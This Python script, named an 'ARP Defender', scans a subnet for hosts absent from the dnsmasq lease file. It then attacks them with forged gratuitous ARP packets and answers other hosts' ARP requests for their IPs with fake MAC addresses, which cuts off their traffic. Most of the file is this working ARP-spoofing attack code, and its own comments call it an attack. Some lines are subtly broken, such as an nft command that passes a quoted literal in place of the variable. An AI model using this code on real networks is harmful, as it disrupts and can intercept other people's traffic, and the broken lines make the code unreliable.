#!/usr/bin/env python3
"""
Unified ARP Defender Script

Purpose:
    This script defends against unauthorized static IP devices on your network.
    It combines THREE strategies:
    1. DISCOVERY: Periodically scans the network to find devices with static IPs
    2. PROACTIVE ATTACK: Sends Gratuitous ARP packets claiming new static IPs
    3. REACTIVE DEFENSE: Intercepts ARP requests for those static IPs and claims ownership
How it works:
    - Runs TWO parallel tasks (threads):
      * Scanner: Every 2 minutes, finds devices not in DHCP leases
                 When NEW static IPs are found, immediately sends GARP attacks
      * Responder: Listens for ARP requests and replies with fake MAC addresses

    - When someone with a static IP tries to communicate, we pretend to be them
    - This causes network confusion for the static IP device, effectively blocking it
Requirements:
    pip install scapy
Usage:
    sudo python3 unified-arp-defender.py --interface eth0 --subnet 10.40.13.0/24
"""
import argparse
import json
import os
import random
import re
import sys
import threading
import time
import subprocess
from typing import Dict, List, Set
from scapy.all import ARP, Ether, sendp, sniff, arping

# ==============================================================================
# CONFIGURATION SECTION - EDIT THESE VALUES AS NEEDED
# ==============================================================================
# How often to scan the network for static IPs (in seconds)
DEFAULT_SCAN_INTERVAL = 20

# Where dnsmasq stores its DHCP lease information
DEFAULT_LEASES_PATH = "/var/lib/misc/dnsmasq.leases"

# Infrastructure devices that should NOT be flagged as static IPs
# These are your access points, switches, routers, etc.
# Add any legitimate static IP devices here
EXCEPTION_IPS = {
    "10.40.13.127",   # AccessPoint 1
    "10.40.13.205",   # AccessPoint 2
    "10.40.13.169",   # AccessPoint 3
    "10.40.13.213",   # AccessPoint 4
    "10.40.13.45",    # AccessPoint 5
    "10.40.13.162",    # AccessPoint 5
    "10.40.13.53",    # AccessPoint 5
    "10.40.13.190",    # akshit VM
    "10.40.13.183",    # akshit VM
    "10.40.13.107",    # sunil VM
}

# Pool of MAC addresses to use when spoofing
# When we intercept an ARP request, we'll randomly pick one of these MACs
# TODO: Replace these placeholder MACs with your actual MAC address pool
MAC_ADDRESS_POOL = [
    "2A:D5:80:DD:1C:88",
    "0a:0f:ff:f0:a0:af",
    "9a:f3:be:17:7c:2c",
    "e2:0e:a1:d4:fd:0b",
    "b6:21:3b:48:78:cd",
    "2A:D5:80:DD:1C:8B",
    "2A:D5:80:DD:1C:8C",
    # Add more MAC addresses as needed
]

# Gratuitous ARP (GARP) configuration
# How many GARP packets to send when a new static IP is detected
GARP_COUNT = 20
# Interval between each GARP packet (in seconds)
GARP_INTERVAL = 4

# ==============================================================================
# GLOBAL SHARED DATA (accessed by both threads)
# ==============================================================================
# Thread-safe lock to prevent race conditions when accessing shared data
data_lock = threading.Lock()

# Set of IP addresses that are currently identified as static
# This is updated by the Scanner thread and read by the Responder thread
static_ip_targets: Set[str] = set()

# ==============================================================================
# FUNCTION: Read DHCP Leases from dnsmasq
# ==============================================================================
def read_dnsmasq_leases(path: str) -> Dict[str, Dict]:
    """
    Why we need this:
        Any device NOT in this file is likely using a static IP (manually configured).
        Static IPs are our targets because they bypass DHCP control.
    Returns:
        Dictionary with IP addresses as keys, containing MAC and hostname info
        Example: {"10.40.13.100": {"mac": "aa:bb:cc:dd:ee:ff", "hostname": "laptop"}}
    """
    leases = {}

    # Check if the leases file exists
    if not os.path.exists(path):
        print(f"[WARNING] Leases file not found: {path}", file=sys.stderr)
        return leases

    # Read the leases file line by line
    with open(path, "r") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue

            # Each line format: <expiry-time> <mac> <ip> <hostname> <client-id>
            parts = line.split()
            if len(parts) < 4:
                continue

            expiry = parts[0]
            mac = parts[1].lower()
            ip = parts[2]
            hostname = parts[3]

            # Store this lease information
            leases[ip] = {
                "mac": mac,
                "hostname": hostname if hostname != "*" else ""
            }

    return leases

# ==============================================================================
# FUNCTION: Run ARP Scan to Discover All Devices
# ==============================================================================
def run_arp_scan(subnet: str, interface: str) -> List[tuple]:
    """
    Uses Scapy's arping to find all active devices on the network.

    What is ARP scan?
        ARP is the Address Resolution Protocol - how devices find each other on a LAN.
        An ARP scan sends requests to all possible IPs and sees who responds.
        It's like calling out "Who's there?" and making a list of everyone who answers.

    Returns:
        List of tuples: [(ip, mac, vendor), ...]
        Example: [("10.40.13.100", "aa:bb:cc:dd:ee:ff", "")]
    """
    if not subnet:
        print("[ERROR] Subnet is required for ARP scan")
        sys.exit(1)

    print(f"[SCANNER] Running ARP scan on {subnet} via {interface}")

    try:
        # Use Scapy's arping function
        # Returns (answered_list, unanswered_list)
        answered, unanswered = arping(subnet, iface=interface, timeout=2, verbose=False)

        entries = []
        for sent, received in answered:
            ip = received[ARP].psrc
            mac = received[ARP].hwsrc.lower()
            # Scapy doesn't provide vendor info, so we leave it empty
            vendor = ""
            entries.append((ip, mac, vendor))

        print(f"[SCANNER] Found {len(entries)} devices via ARP scan")
        return entries

    except Exception as e:
        print(f"[ERROR] ARP scan failed: {e}")
        sys.exit(1)

# ==============================================================================
# FUNCTION: Find Devices with Static IPs
# ==============================================================================
def compute_static_ips(arp_entries: List[tuple], leases: Dict[str, Dict]) -> List[Dict]:
    """
    Compares ARP scan results against DHCP leases to find static IP devices.

    Logic:
        - If a device shows up in the ARP scan...
        - BUT it's NOT in the DHCP leases file...
        - AND it's NOT in our exception list (infrastructure)...
        - THEN it's using a static IP (our target!)

    Returns:
        List of dictionaries with static IP device information
        Example: [{"ip": "10.40.13.100", "mac": "aa:bb:cc:dd:ee:ff", "vendor": "Apple"}]
    """
    lease_ips = set(leases.keys())
    static_devices = []

    for ip, mac, vendor in arp_entries:
        # Skip infrastructure devices (legitimate static IPs)
        if ip in EXCEPTION_IPS:
            continue

        # If this IP is NOT managed by DHCP, it's a static IP
        if ip not in lease_ips:
            static_devices.append({
                "ip": ip,
                "mac": mac,
                "vendor": vendor
            })

    return static_devices

# ==============================================================================
# FUNCTION: Send Gratuitous ARP (GARP) Attack
# ==============================================================================
def send_garp(target_ip: str, target_mac: str, interface: str):
    """
    Sends Gratuitous ARP packets to disrupt a static IP device.
    What is Gratuitous ARP (GARP)?
        A GARP is an unsolicited ARP announcement broadcast to the network.
        It says "Hey everyone! IP address X.X.X.X belongs to MAC address Y!"
        Devices on the network update their ARP caches with this information.

    What we're doing:
        We're broadcasting: "The static IP belongs to OUR fake MAC!"
        This causes several problems for the static IP device:
        1. Other devices think WE are that IP, so they send packets to us
        2. The static IP device gets confused about its own identity
        3. Network communication for that device becomes unreliable/broken

    Why multiple packets?
        - ARP caches have timeouts, so we send multiple announcements
        - Some packets might be lost, so redundancy helps
        - Repeated announcements ensure all devices on the network get updated

    Parameters:
        target_ip: The static IP address we want to disrupt
        target_mac: The real MAC address of the static IP device
        interface: Network interface to send packets on
    """
    # Pick a random MAC from our pool to use for this attack
    spoof_mac = random.choice(MAC_ADDRESS_POOL)

    print(f"\n[GARP ATTACK] Starting attack on {target_ip}")
    print(f"[GARP ATTACK] Real MAC: {target_mac} | Spoofed MAC: {spoof_mac}")
    print(f"[GARP ATTACK] Sending {GARP_COUNT} packets with {GARP_INTERVAL}s intervals\n")

    # Send multiple GARP packets
    for i in range(GARP_COUNT):
        # Build a Gratuitous ARP packet
        # This is an ARP Reply (op=2) sent to the target device
        garp_packet = Ether(dst=target_mac) / ARP(
            op=2,                   # ARP Reply (announcement)
            psrc="10.40.0.1",         # "This IP address..."
            hwsrc=spoof_mac,        # "...belongs to this MAC"
            pdst=target_ip,         # Gratuitous: target = source
            hwdst=target_mac        # Send to the actual target device
        )

        # Send the packet
        sendp(garp_packet, iface=interface, verbose=False)
        print(f"[GARP ATTACK] Packet {i+1}/{GARP_COUNT} sent for {target_ip}", flush=True)

        # Wait before sending next packet (except for the last one)
        if i < GARP_COUNT - 1:
            time.sleep(GARP_INTERVAL)

    print(f"[GARP ATTACK] Attack complete for {target_ip}\n")

# ==============================================================================
# THREAD 1: SCANNER - Periodically Discover Static IPs
# ==============================================================================
def scanner_thread(args):
    """
    This thread runs in a loop, periodically scanning the network.

    What it does:
        1. Sleep for the configured interval (default 2 minutes)
        2. Run an ARP scan to see all devices
        3. Compare against DHCP leases to find static IPs
        4. Update the global target list (thread-safe)
        5. For NEW static IPs: Launch GARP attack threads (proactive disruption)
        6. Repeat forever

    Why it's important:
        Devices come and go. We need to keep our target list up-to-date.
        A device might turn on/off, or change from DHCP to static.
        When we find a NEW static IP, we immediately attack it with GARP packets.
    """
    global static_ip_targets

    print("[SCANNER] Scanner thread started")
    print(f"[SCANNER] Will scan every {args.scan_interval} seconds\n")

    while True:
        try:
            print(f"\n{'='*70}")
            print(f"[SCANNER] Starting network scan at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"{'='*70}")

            # Step 1: Load current DHCP leases
            leases = read_dnsmasq_leases(args.leases)
            print(f"[SCANNER] Loaded {len(leases)} DHCP leases from dnsmasq")

            # Step 2: Scan network for all active devices
            arp_entries = run_arp_scan(args.subnet, args.interface)
            print(f"[SCANNER] Found {len(arp_entries)} active devices on network")

            # DEBUG: Print all ARP scan results
            print(f"\n[DEBUG] ===== ALL ARP SCAN RESULTS ({len(arp_entries)}) =====")
            if arp_entries:
                for ip, mac, vendor in arp_entries:
                    in_dhcp = "YES" if ip in leases else "NO"
                    is_exception = "YES" if ip in EXCEPTION_IPS else "NO"
                    print(f"[DEBUG]   IP: {ip:16} | MAC: {mac:18} | Vendor: {vendor:20} | In DHCP: {in_dhcp:3} | Exception: {is_exception}")
            else:
                print("[DEBUG]   (No devices found in ARP scan)")
            print(f"[DEBUG] {'='*50}\n")

            # Step 3: Identify which devices have static IPs
            static_devices = compute_static_ips(arp_entries, leases)

            # Step 4: Update the global target list (thread-safe!)
            # We use a lock to prevent the Responder thread from reading
            # while we're updating
            with data_lock:
                old_targets = static_ip_targets.copy()
                static_ip_targets = {device["ip"] for device in static_devices}

                # Show what changed
                new_targets = static_ip_targets - old_targets
                removed_targets = old_targets - static_ip_targets

                if new_targets:
                    print(f"\n[SCANNER] NEW static IPs detected: {', '.join(new_targets)}")
                if removed_targets:
                    print(f"[SCANNER] Static IPs removed: {', '.join(removed_targets)}")

            # Step 4.5: Launch GARP attacks for NEW static IPs
            # For each newly discovered static IP, we immediately launch a GARP attack
            # This happens in a separate thread so it doesn't block the scanner
            if new_targets:
                print(f"[SCANNER] Launching GARP attacks for {len(new_targets)} new target(s)...")

                # Create a mapping of IP -> device info for quick lookup
                device_map = {d["ip"]: d for d in static_devices}

                # Launch a GARP attack thread for each new target
                for target_ip in new_targets:
                    device_info = device_map.get(target_ip)
                    if device_info:
                        # Create a thread to send GARP packets
                        # This runs in the background so we can continue scanning
                        garp_worker = threading.Thread(
                            target=send_garp,
                            args=(target_ip, device_info["mac"], args.interface),
                            daemon=True,
                            name=f"GARP-{target_ip}"
                        )
                        garp_worker.start()
#                        print(f"${target_ip} removing nftables rules")
                        print(f"{target_ip} removing nftables rules")
                        nftcmd = f'nft delete element inet captive auth_clients {"target_ip"}'
                        subprocess.run(nftcmd, shell=True)
                        print(f"[SCANNER] GARP thread launched for {target_ip}")

            # Step 5: Display current static IP list
            print(f"\n[SCANNER] === Current Static IP Targets ({len(static_devices)}) ===")
            if static_devices:
                for device in static_devices:
                    print(f"  {device['ip']:16}  {device['mac']:18}  {device['vendor']}")
            else:
                print("  (No static IPs detected)")
            print(f"{'='*70}\n")

            # Step 6: Wait before next scan
            print(f"[SCANNER] Next scan in {args.scan_interval} seconds...")
            time.sleep(args.scan_interval)

        except Exception as e:
            print(f"[ERROR] Scanner thread error: {e}")
            # Wait a bit before retrying to avoid rapid error loops
            time.sleep(30)


# ==============================================================================
# THREAD 2: RESPONDER - Intercept and Reply to ARP Requests
# ==============================================================================
def responder_thread(args):
    """
    This thread listens for ARP requests and responds to them.

    What is an ARP request?
        When Device A wants to talk to Device B, it broadcasts:
        "Who has IP address X.X.X.X? Tell me your MAC address!"

    What we do:
        If X.X.X.X is in our static IP target list, we reply:
        "That's me! My MAC address is <random-fake-mac>"

    Why this works:
        Device A now thinks WE are Device B. When Device A sends packets,
        they come to us (or nowhere) instead of to the real static IP device.
        This causes network chaos for the static IP device.

    Technical note:
        We use multithreading within this thread to avoid blocking.
        When we need to send a reply, we spawn a quick worker thread
        so we can immediately go back to listening for more requests.
    """
    global static_ip_targets

    print("[RESPONDER] Responder thread started")
    print(f"[RESPONDER] Listening for ARP requests on {args.interface}\n")

    def send_spoofed_reply(src_mac: str, target_ip: str, src_ip: str):
        """
        Worker function: Sends a fake ARP reply (runs in separate thread).

        Parameters:
            src_mac: MAC address of the device asking the question
            target_ip: The IP address being asked about (our target)
            src_ip: The IP address of the device asking
        """
        # Pick a random MAC from our pool
        spoof_mac = random.choice(MAC_ADDRESS_POOL)

        # Build the ARP reply packet
        # We tell the asker: "target_ip belongs to spoof_mac"
        reply = Ether(dst=src_mac) / ARP(
            op=2,                   # 2 = ARP Reply
            psrc=target_ip,         # "I am this IP"
            hwsrc=spoof_mac,        # "My MAC is this"
            pdst=src_ip,            # "Telling you (the asker)"
            hwdst=src_mac           # "At your MAC address"
        )

        print(f"[RESPONDER] >>> Spoofing: {target_ip} is-at {spoof_mac} (telling {src_ip})")
        sendp(reply, iface=args.interface, verbose=False)

    def handle_arp_packet(packet):
        """
        Packet handler: Called for every ARP packet we see.

        This runs very frequently, so it must be FAST.
        We check if we care about this packet, and if so,
        spawn a worker thread to handle the reply.
        """
        # Only care about ARP requests (op=1 means "who-has")
        if ARP in packet and packet[ARP].op == 1:
            src_ip = packet[ARP].psrc      # Who's asking
            src_mac = packet[ARP].hwsrc    # Their MAC
            target_ip = packet[ARP].pdst   # What IP they're asking about

            # Check if the requested IP is one of our targets
            # Use lock to safely read the shared set
            with data_lock:
                is_target = target_ip in static_ip_targets

            if is_target:
                print(f"[RESPONDER] Intercepted: Who has {target_ip}? (from {src_ip})")

                # Spawn a worker thread to send the reply
                # This prevents blocking the packet sniffer
                worker = threading.Thread(
                    target=send_spoofed_reply,
                    args=(src_mac, target_ip, src_ip),
                    daemon=True  # Thread dies when main program exits
                )
                worker.start()

    # Start listening for ARP packets
    # This is a blocking call that runs forever
    # Every ARP packet triggers handle_arp_packet()
    print("[RESPONDER] Sniffing started...\n")
    sniff(
        filter="arp",              # Only capture ARP packets
        prn=handle_arp_packet,     # Call this function for each packet
        store=False,               # Don't store packets (saves memory)
        iface=args.interface       # Listen on specified interface
    )


# ==============================================================================
# MAIN PROGRAM
# ==============================================================================
def main():
    """
    Main entry point: Parse arguments and start both threads.

    Program flow:
        1. Parse command-line arguments
        2. Display configuration
        3. Start Scanner thread (finds static IPs periodically, launches GARP attacks)
        4. Start Responder thread (intercepts ARP requests)
        5. Both threads run forever in parallel
    """
    # Parse command-line arguments
    parser = argparse.ArgumentParser(
        description="Unified ARP Defender: Detects and disrupts static IP devices"
    )
    parser.add_argument(
        "--interface", "-i",
        required=True,
        help="Network interface to use (e.g., eth0, eth1, ens33)"
    )
    parser.add_argument(
        "--subnet", "-s",
        required=True,
        help="Subnet to scan in CIDR notation (e.g., 10.40.13.0/24)"
    )
    parser.add_argument(
        "--leases", "-l",
        default=DEFAULT_LEASES_PATH,
        help=f"Path to dnsmasq leases file (default: {DEFAULT_LEASES_PATH})"
    )
    parser.add_argument(
        "--scan-interval",
        type=int,
        default=DEFAULT_SCAN_INTERVAL,
        help=f"Seconds between network scans (default: {DEFAULT_SCAN_INTERVAL})"
    )

    args = parser.parse_args()

    # Display startup banner
    print("\n" + "="*70)
    print("           UNIFIED ARP DEFENDER - STARTING UP")
    print("="*70)
    print(f"Interface       : {args.interface}")
    print(f"Subnet          : {args.subnet or 'auto-detect'}")
    print(f"DHCP Leases     : {args.leases}")
    print(f"Scan Interval   : {args.scan_interval} seconds")
    print(f"MAC Pool Size   : {len(MAC_ADDRESS_POOL)} addresses")
    print(f"Exception IPs   : {len(EXCEPTION_IPS)} devices")
    print(f"GARP Config     : {GARP_COUNT} packets, {GARP_INTERVAL}s intervals")
    print("="*70)
    print("\nStarting dual-thread operation:")
    print(f"  [1] Scanner   : Discovers static IPs every {args.scan_interval}s")
    print( "                  Launches GARP attacks on NEW targets")
    print( "  [2] Responder : Intercepts ARP requests continuously")
    print("\nPress Ctrl+C to stop\n")
    print("="*70 + "\n")

    # Create and start Scanner thread
    scanner = threading.Thread(
        target=scanner_thread,
        args=(args,),
        daemon=True,
        name="Scanner"
    )
    scanner.start()

    # Create and start Responder thread
    # Note: This blocks forever, so it runs in the main thread
    responder = threading.Thread(
        target=responder_thread,
        args=(args,),
        daemon=True,
        name="Responder"
    )
    responder.start()

    # Keep main thread alive
    # Both daemon threads will run until Ctrl+C
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n[INFO] Shutting down gracefully...")
        print("[INFO] Goodbye!\n")
        sys.exit(0)


if __name__ == "__main__":
    main()
